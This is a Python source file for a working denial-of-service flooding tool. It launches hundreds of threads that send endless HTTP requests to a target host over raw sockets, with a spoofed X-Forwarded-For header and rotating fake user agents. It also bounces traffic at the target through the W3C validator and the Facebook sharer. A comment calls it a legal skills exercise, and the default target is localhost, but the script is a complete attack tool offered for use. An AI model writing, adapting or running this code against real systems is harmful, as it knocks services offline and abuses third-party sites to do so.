from fake_useragent import UserAgent
import queue
import urllib.request
import socket
import threading
import time
import threading
import random
import logging

logging.basicConfig(level=logging.DEBUG)

host = "127.0.0.1"
port = 5000
thr = 500
spoof_ip = "10.181.12.14"

def user_agents():
    # You can add user agent list manually and use protonVPN, I use fake_useragent for test
    # Make it legal and for grow your skills only
    return [UserAgent().chrome for i in range(100)]

def bots():
    return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
            ]

def bot_rippering(url, uagent):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            logging.info("[INFO] Bot is rippering...")
            time.sleep(0.1)
    except Exception as error:
        logging.error(f"[ERROR] Error has an occurred: {error}")

def down_it(item, host, port, uagent):
    try:
        while True:
            packet = str(f"GET / HTTP/1.1\r\nHost: {host}\r\nX-Forworded-For: {spoof_ip}\r\nUser-Agent: {random.choice(uagent)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode("UTF-8")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host,int(port)))
            if sock.send(packet):
                sock.shutdown(1)
                logging.info(f"[INFO] Packet sent rippering [{time.ctime(time.time())}]")
            else:
                sock.shutdown(1)
                logging.warning("[WARNING] Shut down")
    except socket.error as error:
        logging.error(f"[ERROR] Error has an occurred: {error}")

def dos(q, host, port, uagent):
    while True:
        item = q.get()
        down_it(item, host, port, uagent)
        q.task_done()

def dos2(w, host, uagent):
    while True:
        item = w.get()
        bot_rippering(random.choice(bot) + "http://" + host, uagent)
        w.task_done()

if __name__ == "__main__":
    uagent = user_agents()
    bot = bots()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host,int(port)))
        sock.settimeout(2)
    except socket.error as error:
        logging.error(f"[ERROR] Error has an occurred: {error}")
    q = queue.Queue()
    w = queue.Queue()
    while True:
        for i in range(int(thr)):
            threading.Thread(target=dos, args=(q, host, port, uagent), daemon=True).start()
            threading.Thread(target=dos2, args=(w, host, uagent), daemon=True).start()
        item = 0
        while True:
            if item > 1800:
                item = 0
            q.put(item)
            w.put(item)
            item += 1
            q.join()
            w.join()
